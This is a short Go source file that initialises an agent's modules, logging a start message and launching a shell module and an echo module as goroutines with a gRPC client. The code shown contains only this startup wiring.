package modules

import (
	"log"
	pb "viper/protos/cmds"
)

func InitModules(client pb.AgentClient) {
	log.Print("Starting agent modules.")
	go runShellModule(client)
	go runEchoModule(client)
}
